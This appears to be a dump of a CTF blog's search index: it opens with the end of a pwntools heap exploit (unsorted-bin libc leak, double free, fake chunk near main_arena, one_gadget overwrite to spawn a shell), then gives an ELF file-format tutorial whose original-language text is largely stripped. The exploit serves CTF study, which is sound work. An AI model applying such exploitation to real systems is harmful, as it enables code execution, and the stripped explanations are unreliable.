class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_sentence</span>(<span class="params">s</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3: Quit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the sentence size:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(s)).encode())</span><br><span class="line">    io.send(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_word</span>(<span class="params">word</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3: Quit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the word size:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(word)).encode())</span><br><span class="line">    io.send(word)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x400B41&#x27;)#judge</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B41&#x27;)# rcx</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BED&#x27;)</span></span><br><span class="line">smallbin_sentence = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x85</span> + <span class="string">b&#x27; b&#x27;</span></span><br><span class="line">index_sentence(smallbin_sentence)</span><br><span class="line">search_word(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Found 135: &#x27;</span>)</span><br><span class="line">unsortbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">main_arena=unsortbin_addr-<span class="number">88</span></span><br><span class="line">libc=main_arena-<span class="number">0x3C4B20</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)  <span class="comment">#b</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#a</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#first chunk</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fakechunk=main_arena-<span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fakechunk).ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(fake_chunk)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">one_gadget_addr = libc + <span class="number">0xf1247</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unsorted Bin Leak </tag>
            
            <tag> Byte misalignmen </tag>
            
            <tag> Double Free </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF(ELF File Parsing)</title>
      <link href="/2023/03/19/23-2-21-elf/"/>
      <url>/2023/03/19/23-2-21-elf/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF-File-Parsing"><a href="#ELF-File-Parsing" class="headerlink" title="ELF File Parsing"></a>ELF File Parsing</h1><p><strong>Executable and Linkable Format</strong></p><p>010editor readelf objdump linux_ls(x86-64)</p><p>32elf64elf</p><p>ls</p><p><a href="https://pan.baidu.com/s/17ElUYwRhtW0eRRED4SgNDA">https://pan.baidu.com/s/17ElUYwRhtW0eRRED4SgNDA</a><br>ldss</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(kalikali)-[~/Desktop/test]</span><br><span class="line">$ checksec ./ls    </span><br><span class="line">[*] &#x27;/home/kali/Desktop/test/ls&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled                                                    </span><br><span class="line">(kalikali)-[~/Desktop/test]</span><br><span class="line">$ file ./ls    </span><br><span class="line">./ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=15dfff3239aa7c3b16a71e6b2e3b6e4009dab998, for GNU/Linux 3.2.0, stripped</span><br><span class="line">(kalikali)-[~/Desktop/test]</span><br><span class="line">$ ldd ./ls               </span><br><span class="line">        linux-vdso.so.1 (0x00007ffcd2d86000)</span><br><span class="line">        libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ff70107a000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff700e99000)</span><br><span class="line">        libpcre2-8.so.0 =&gt; /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007ff700dff000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007ff7010e6000)</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Elf32_Addr</td><td>4</td><td>4</td><td></td></tr><tr><td>Elf32_Half</td><td>2</td><td>2</td><td></td></tr><tr><td>Elf32_Off</td><td>4</td><td>4</td><td></td></tr><tr><td>Elf32_Sword</td><td>4</td><td>4</td><td></td></tr><tr><td>Elf32_Word</td><td>4</td><td>4</td><td></td></tr><tr><td>unsigned char</td><td>1</td><td>1</td><td></td></tr></tbody></table><p><img src="/2023/03/19/23-2-21-elf/image-20230221233642860.png" alt="image-20230221233642860"></p><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><ul><li>ELFELF header<ul><li>ELF</li></ul></li></ul><p>ELF</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT   16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT]; <span class="comment">/* ELF */</span></span><br><span class="line">    Elf32_Half      e_type;             <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Half      e_machine;          <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Word      e_version;          <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Addr      e_entry;            <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Off       e_phoff;            <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Off       e_shoff;            <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Word      e_flags;            <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Half      e_ehsize;           <span class="comment">/* ELF */</span></span><br><span class="line">    Elf32_Half      e_phentsize;        <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Half      e_phnum;            <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Half      e_shentsize;        <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Half      e_shnum;            <span class="comment">/*  */</span></span><br><span class="line">    Elf32_Half      e_shstrndx;         <span class="comment">/*  */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">$ readelf -h ./ls</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              DYN (Position-Independent Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x61d0</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          149360 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         13</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         31</span><br><span class="line">  Section header string table index: 30</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="e-dient"><a href="#e-dient" class="headerlink" title="e_dient"></a>e_dient</h3><ul><li>16</li><li>4  ELF <code>7f 45 4c 46</code>(.ELF)windowsPE(Portable Executable)<code>4D 5A</code>(MZ)</li><li> <ul><li>0 </li><li>1 32 </li><li>2 64</li></ul></li><li><ul><li>0 </li><li>1  LSB</li><li>2  MSB</li></ul></li><li>.ELF,</li></ul><p><img src="/2023/03/19/23-2-21-elf/image-20230221231314941.png" alt="image-20230221231314941"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">$ readelf -h ./ls</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 0e ee ee ee ee ee ee ee ee ee ee ee </span><br><span class="line">  Class:                             &lt;unknown: e&gt;</span><br><span class="line">  Data:                              &lt;unknown: ee&gt;</span><br><span class="line">  Version:                           238 &lt;unknown&gt;</span><br><span class="line">  OS/ABI:                            &lt;unknown: ee&gt;</span><br><span class="line">  ABI Version:                       238</span><br><span class="line">  Type:                              DYN (Shared object file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x61d0</span><br><span class="line">  Start of program headers:          0 (bytes into file)</span><br><span class="line">  Start of section headers:          64 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               18288 (bytes)</span><br><span class="line">  Size of program headers:           2 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           0 (bytes)</span><br><span class="line">  Number of section headers:         0</span><br><span class="line">  Section header string table index: 0</span><br><span class="line">readelf: Warning: possibly corrupt ELF file header - it has a non-zero section header offset, but no section headers</span><br></pre></td></tr></table></figure><h3 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h3><p></p><table><thead><tr><th align="left"></th><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">ET_NONE</td><td align="left">0</td><td align="left"></td></tr><tr><td align="left">ET_REL</td><td align="left">1</td><td align="left"></td></tr><tr><td align="left">ET_EXEC</td><td align="left">2</td><td align="left"></td></tr><tr><td align="left">ET_DYN</td><td align="left">3</td><td align="left"></td></tr><tr><td align="left">ET_CORE</td><td align="left">4</td><td align="left"></td></tr><tr><td align="left">ET_LOPROC</td><td align="left">0xff00</td><td align="left"></td></tr><tr><td align="left">ET_HIPROC</td><td align="left">0xffff</td><td align="left"></td></tr></tbody></table><p>lspie3</p><p><code>PIE</code><code>ELF</code></p><h3 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h3><p></p><p></p><table><thead><tr><th align="left"></th><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">EM_NONE</td><td align="left">0</td><td align="left"></td></tr><tr><td align="left">EM_M32</td><td align="left">1</td><td align="left">AT&amp;T WE 32100</td></tr><tr><td align="left">EM_SPARC</td><td align="left">2</td><td align="left">SPARC</td></tr><tr><td align="left">EM_386</td><td align="left">3</td><td align="left">Intel 80386</td></tr><tr><td align="left">EM_68K</td><td align="left">4</td><td align="left">Motorola 68000</td></tr><tr><td align="left">EM_88K</td><td align="left">5</td><td align="left">Motorola 88000</td></tr><tr><td align="left">EM_860</td><td align="left">7</td><td align="left">Intel 80860</td></tr><tr><td align="left">EM_MIPS</td><td align="left">8</td><td align="left">MIPS RS3000</td></tr></tbody></table><h3 id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h3><p></p><p></p><h3 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h3><p></p><p> ELF ,pc ,hook</p><h3 id="e-phoff"><a href="#e-phoff" class="headerlink" title="e_phoff"></a>e_phoff</h3><p></p><p>Program Header table OFFset</p><p>elf</p><h3 id="e-shoff"><a href="#e-shoff" class="headerlink" title="e_shoff"></a>e_shoff</h3><p></p><p>Section Header table OFFset</p><p>elf</p><h3 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h3><p></p><p></p><h3 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h3><p></p><p>ELF HEADER </p><h3 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h3><p></p><p>Program Header ENTry SIZE</p><p>program header table</p><h3 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h3><p></p><p>Program Header entry NUMber</p><p>program header table</p><h3 id="e-shentsize"><a href="#e-shentsize" class="headerlink" title="e_shentsize"></a>e_shentsize</h3><p></p><p>Section Header ENTry SIZE</p><p>section</p><h3 id="e-shnum"><a href="#e-shnum" class="headerlink" title="e_shnum"></a>e_shnum</h3><p></p><p>Section Header NUMber</p><p>section</p><h3 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h3><p></p><p><strong>Program Header table Section Header Table</strong></p><h2 id="Program-Header-table"><a href="#Program-Header-table" class="headerlink" title="Program Header table"></a>Program Header table</h2><p><strong></strong></p><ul><li>&#x2F;Program header table<ul><li></li><li></li><li></li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    p_type;<span class="comment">/* Segment type */</span></span><br><span class="line">  Elf64_Word    p_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf64_Off    p_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf64_Addr    p_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf64_Addr    p_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf64_Xword    p_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf64_Xword    p_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf64_Xword    p_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><h3 id="p-type"><a href="#p-type" class="headerlink" title="p_type"></a>p_type</h3><p>PT_LOAD  1   p_filesz  p_memsz  p_memsz  p_filesz  0p_filesz  p_memsz p_vaddr </p><p>PT_GNU_RELRO  GNU ld linker <code>PT_GNU_RELRO</code>  <code>RELRO</code>  RELocation Read-Only  ( .rodata)  (Global Offset Table GOT)  (Relocation Table) GOT </p><p> </p><h3 id="ls-program-head-table-"><a href="#ls-program-head-table-" class="headerlink" title="ls program head table "></a>ls program head table </h3><p><img src="/2023/03/19/23-2-21-elf/image-20230223004348967.png" alt="image-20230223004348967"></p><p>(&#x3D;&#x3D;&#x3D;&#x3D;)Program Header  Interpreter Path()</p><ul><li><p>Program Header</p><p><img src="/2023/03/19/23-2-21-elf/image-20230223163500827.png" alt="image-20230223163500827"></p><p>p_offset_FROM_FILE_BEGINp_vaddr_virtual_addreesELF Headere_phoffelfprogram header tableelf header()offsetelf headerelf header</p></li><li><p>Interpreter Path</p><p><img src="/2023/03/19/23-2-21-elf/image-20230223165238248.png" alt="image-20230223165238248"></p><p>offset 0x318LENGTH28loadable</p><p><code>/lib64/ld-linux-x86-64.so.2</code>  Linux x86-64 dynamic linkershared library</p></li><li><p>Loadable segment</p><p><img src="/2023/03/19/23-2-21-elf/image-20230309185924942.png" alt="image-20230309185924942"></p><p>mmappie+virtual_addressfile_beginraw_length4096()</p></li><li><p>Dynamic segment</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318221408017.png" alt="image-20230318221408017"></p><p></p><p></p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword    d_tag;<span class="comment">/* Dynamic entry type *648bit /</span></span><br><span class="line"><span class="comment">  union</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;                     <span class="number">64</span><span class="number">8b</span>it </span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL        0<span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED    1<span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ    2<span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT    3<span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH        4<span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB    5<span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB    6<span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA        7<span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ    8<span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELAENT    9<span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ    10<span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT    11<span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT        12<span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI        13<span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SONAME    14<span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RPATH    15<span class="comment">/* Library search path (deprecated) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMBOLIC    16<span class="comment">/* Start symbol search here */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_REL        17<span class="comment">/* Address of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELSZ    18<span class="comment">/* Total size of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELENT    19<span class="comment">/* Size of one Rel reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTREL    20<span class="comment">/* Type of reloc in PLT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_DEBUG    21<span class="comment">/* For debugging; unspecified */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TEXTREL    22<span class="comment">/* Reloc might modify .text */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_JMPREL    23<span class="comment">/* Address of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_BIND_NOW24<span class="comment">/* Process relocations of object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAY25<span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAY26<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAYSZ27<span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAYSZ28<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RUNPATH    29<span class="comment">/* Library search path */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FLAGS    30<span class="comment">/* Flags for the object being loaded */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ENCODING    32<span class="comment">/* Start of encoded range */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PREINIT_ARRAY 32        <span class="comment">/* Array with addresses of preinit fct*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PREINIT_ARRAYSZ 33        <span class="comment">/* size in bytes of DT_PREINIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB_SHNDX    34<span class="comment">/* Address of SYMTAB_SHNDX section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_NUM35<span class="comment">/* Number used */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_LOOS        0x6000000d<span class="comment">/* Start of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HIOS        0x6ffff000<span class="comment">/* End of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_LOPROC    0x70000000<span class="comment">/* Start of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HIPROC    0x7fffffff<span class="comment">/* End of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_PROCNUMDT_MIPS_NUM<span class="comment">/* Most used by any processor */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRRNGLO    0x6ffffe00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_GNU_HASH    0x6ffffef5<span class="comment">/* GNU-style hash table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TLSDESC_PLT    0x6ffffef6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TLSDESC_GOT    0x6ffffef7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_GNU_CONFLICT    0x6ffffef8<span class="comment">/* Start of conflict section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_GNU_LIBLIST    0x6ffffef9<span class="comment">/* Library list */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_CONFIG    0x6ffffefa<span class="comment">/* Configuration information.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_DEPAUDIT    0x6ffffefb<span class="comment">/* Dependency auditing.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_AUDIT    0x6ffffefc<span class="comment">/* Object auditing.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_PLTPAD0x6ffffefd<span class="comment">/* PLT padding.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_MOVETAB0x6ffffefe<span class="comment">/* Move table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMINFO    0x6ffffeff<span class="comment">/* Syminfo table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRRNGHI    0x6ffffeff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRTAGIDX(tag)    (DT_ADDRRNGHI - (tag))<span class="comment">/* Reverse order! */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRNUM 11</span></span><br></pre></td></tr></table></figure><ul><li><p>d_tag&#x3D;5section.dynstrsetion</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318230730833.png" alt="image-20230318230730833"></p><p><img src="/2023/03/19/23-2-21-elf/image-20230817101327570.png" alt="image-20230817101327570"></p></li><li><p>d_tag&#x3D;1 </p><p><img src="/2023/03/19/23-2-21-elf/image-20230318231041729.png" alt="image-20230318231041729"></p><p>0x1040+0x0542&#x3D;0x1582 0x1040+0x0552&#x3D;0x1592</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318231247771.png" alt="image-20230318231247771"></p></li><li><p> d_tag&#x3D;6 section .dynsym</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318232353517.png" alt="image-20230318232353517"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;<span class="number">4</span><span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;<span class="number">1</span><span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;    <span class="number">1</span><span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section    st_shndx;<span class="number">2</span><span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr    st_value;<span class="number">8</span><span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword    st_size;<span class="number">8</span><span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;                <span class="number">24</span></span><br></pre></td></tr></table></figure></li><li><p> d_tag&#x3D;23&#x3D;0x17</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319004444739.png" alt="image-20230319004444739"></p><p>sized_tag&#x3D;2</p><p><img 